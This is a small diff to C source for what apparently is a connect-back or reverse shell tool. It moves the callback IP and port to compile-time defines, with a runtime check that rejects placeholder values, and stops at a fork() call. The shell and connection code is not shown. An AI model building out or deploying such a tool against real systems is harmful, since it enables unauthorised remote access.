@@ -13,19 +13,22 @@
 #include <sys/types.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 /* ================================================== */
 /* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
 /* ================================================== */
-#define CLIENT_IP "0.0.0.0"
-#define CLIENT_PORT (int)0
+#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
+# define CLIENT_IP "0.0.0.0"
+# define CLIENT_PORT (int)0
+#endif
 /* ================================================== */
 
 int main(void) {
-#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
-	write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
-	return (1);
-#endif
+	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
+		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
+		return (1);
+	}
 
 #ifndef WIN32
 	pid_t pid = fork();
